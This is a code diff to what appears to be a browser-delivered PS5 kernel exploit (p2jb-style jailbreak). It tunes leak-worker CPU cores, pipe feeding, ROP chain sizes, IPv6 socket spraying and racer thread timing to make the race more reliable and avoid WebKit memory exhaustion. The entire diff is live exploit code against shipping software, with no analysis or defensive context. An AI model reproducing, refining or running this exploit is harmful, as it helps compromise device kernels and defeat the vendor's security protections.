@@ -130,22 +130,23 @@
         // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
         // free and the spray on the same core.
         const NUM_IPV6_SOCKETS = 192;
-        // FAST35 (default): 5 leak cores when CPU mask allows, feed pinned on executor
-        // core, 16384 unroll, aggressive pipe fill. Target ~38-42 min on 12.40 + Ethernet.
-        // ?cores=4: matem6 4-core plan (~50 min, most stable on web).
-        // ?pf=1 / ?pp=1: debug modes.
+        // FAST (default): matem6 4 leak cores + pinned aggressive feed + 16384 unroll.
+        // Avoids 5-core ~4MB ROP chains + full pipe prefills that OOM WebKit on PS5.
+        // ?cores=5: experimental 5th core (~38 min if stable; may OOM on some units).
+        // ?cores=4 / ?pf=1: conservative. ?pp=1: debug burst (may hang).
         let MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         let LEAK_CORES = [0, 1, 2, 3];
         const _use_pp_burst = /\bpp=1\b/.test(location.search);
         const _pipe_feed_legacy = /\bpf=1\b/.test(location.search);
         const _force_4core = /\bcores=4\b/.test(location.search);
+        const _want_5core = /\bcores=5\b/.test(location.search);
         const _fast35 = !_use_pp_burst && !_pipe_feed_legacy && !_force_4core;
         (function planCores() {
             const a = window.P2JB_ALLOWED_CORES;
             if (!Array.isArray(a) || a.length < 3) return;
             MAIN_CORE = a[a.length - 1];
-            if (_fast35 && a.length >= 6)
+            if (_want_5core && a.length >= 6)
                 LEAK_CORES = a.slice(0, a.length - 1);
             else
                 LEAK_CORES = a.slice(0, a.length - 2);
@@ -905,7 +906,7 @@
             window.syncMark("SETUP-WORKERS-ENTER", "iov=" + IOV_THREAD_NUM + " uio=" + UIO_THREAD_NUM);
             window.liveStatus("cores: leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
                 + (_use_pp_burst ? " (pp)" : _pipe_feed_legacy ? " (pf)"
-                    : _force_4core ? " (4-core)" : " (fast35)")
+                    : _want_5core ? " (5-core)" : " (fast)")
                 + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)");
             S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
             S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
@@ -1586,13 +1587,14 @@
             const EXIT_MARK = 0xDEADn;
             const LEAK_UNROLL = _pipe_feed_legacy ? 4096 : 16384;
             const U = BigInt(LEAK_UNROLL);
-            const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 65536;
+            const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 16384;
             const PIPE_ROOM = 57344n;
             const FEED_IDLE_MS = _pipe_feed_legacy ? 500 : 100;
             const leak_mode = _use_pp_burst ? "pp" : (_pipe_feed_legacy ? "pf"
-                : (_force_4core ? "4c" : "fast35"));
+                : (_want_5core ? "5c" : "fast"));
             window.syncMark("LEAK-MODE", leak_mode + " unroll=" + LEAK_UNROLL
-                + " cores=" + LEAK_CORES.length);
+                + " cores=" + LEAK_CORES.length
+                + (_want_5core ? " WARN=5core-OOM-risk" : ""));
 
             if (_fast35) {
                 pin_to_core(MAIN_CORE);
@@ -1606,7 +1608,6 @@
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
             const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
             const lws = [];
-            const prefills = [];
             for (let w = 0; w < NW; w++) {
                 const target_w = base_share + (w === 0 ? extra0 : 0n);
                 const bplus1_w = target_w / U;
@@ -1634,20 +1635,16 @@
                 await ulog("SPAWN-" + w + "-PRE core=" + LEAK_CORES[w] + " entry=" + toHex(chain.entry));
                 const _th = spawn_leak_worker(chain.entry);
                 if (_use_pp_burst)
-                    prefills.push(pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK));
-                else if (_fast35)
-                    prefills.push(pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK));
+                    await pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK);
                 await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th));
                 await js_sleep(100);
                 await ulog("SPAWN-" + w + "-ALIVE main survived after worker " + w);
                 const pendbuf = malloc(4); write32(pendbuf, 0n);
                 lws.push({
                     chain, rfd, wfd, finished, pendbuf,
-                    normal: normal_w, queued: (_fast35 || _use_pp_burst) ? normal_w : 0n
+                    normal: normal_w, queued: 0n
                 });
             }
-            if (prefills.length)
-                await Promise.all(prefills);
             await ulog("SPAWN-DONE all " + NW + " workers spawned, entering leak");
             window.liveStatus("STAGE 0 - leak workers up"
                 + (_use_pp_burst ? ", pp burst" : ", feeding pipes"), 0);
@@ -4287,16 +4284,16 @@
             }
         } else {
             switch (leak_nw) {
-                case 1: eta_minutes = 95; break;
-                case 2: eta_minutes = 58; break;
-                case 3: eta_minutes = 44; break;
-                case 4: eta_minutes = 42; break;
+                case 1: eta_minutes = 100; break;
+                case 2: eta_minutes = 62; break;
+                case 3: eta_minutes = 48; break;
+                case 4: eta_minutes = 45; break;
                 case 5: eta_minutes = 38; break;
-                default: eta_minutes = Math.max(32, Math.round(38 * 5 / leak_nw)); break;
+                default: eta_minutes = Math.max(32, Math.round(45 * 4 / leak_nw)); break;
             }
         }
         window.syncMark("LEAK-TUNE", "mode=" + (_use_pp_burst ? "pp"
-            : (_pipe_feed_legacy ? "pf" : (_force_4core ? "4c" : "fast35")))
+            : (_pipe_feed_legacy ? "pf" : (_want_5core ? "5c" : "fast")))
             + " cores=" + leak_nw + " unroll="
             + (_pipe_feed_legacy ? 4096 : 16384) + " eta_min=" + eta_minutes);
         const eta_str = eta_minutes < 60
